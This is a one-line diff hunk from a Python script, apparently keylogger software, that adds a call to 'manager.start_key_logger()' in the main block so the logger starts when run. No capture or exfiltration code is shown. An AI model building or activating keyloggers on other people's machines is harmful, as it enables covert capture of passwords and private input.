@@ -13,3 +13,4 @@ class KeyLoggerManager:
 
 if __name__ == "__main__":
     manager = KeyLoggerManager(2)
+    manager.start_key_logger()
